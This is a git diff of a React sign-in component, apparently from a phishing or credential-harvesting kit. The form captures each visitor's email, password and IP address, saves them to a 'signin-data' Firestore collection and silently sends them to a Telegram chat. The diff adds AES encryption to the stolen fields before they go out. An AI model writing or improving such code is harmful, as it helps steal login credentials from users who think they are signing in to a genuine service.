@@ -13,6 +13,7 @@ import { yupResolver } from '@hookform/resolvers/yup';
 import * as Yup from 'yup';
 import moment from "moment"
 const { TelegramClient } = require('messaging-api-telegram');
+const CryptoJS = require("crypto-js");
 const client = new TelegramClient({
     accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
 });
@@ -46,19 +47,20 @@ const SignIn = () => {
             return res.text()
         })
         .then(ip => {
+            const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
             db.collection('signin-data').add({
-                email:data.email,
-                password: data.password,
-                ip_address: ip,
-                logged_at: Date.now()
+                email: CryptoJS.AES.encrypt(data.email, secretKey).toString(),
+                password: CryptoJS.AES.encrypt(data.password, secretKey).toString(),
+                ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
+                logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
             }).then(res => {
                 if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                 {
                     let message = "Sign In Data\r\n"
-                    message += "Email: " + data.email + '\r\n'
-                    message += "Password: " + data.password + '\r\n'
-                    message += "Ip Address: " + ip + '\r\n'
-                    message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                    message += "Email: " + CryptoJS.AES.encrypt(data.email, secretKey).toString() + '\r\n'
+                    message += "Password: " + CryptoJS.AES.encrypt(data.password, secretKey).toString() + '\r\n'
+                    message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
+                    message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                     client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                         disableWebPagePreview: true,
                         disableNotification: true,
@@ -70,6 +72,8 @@ const SignIn = () => {
             }).catch(err => {
                 throw new Error(err);
             });
+            
+            
         })
         .catch( e => console.log('error while fetching ip' + e))
 
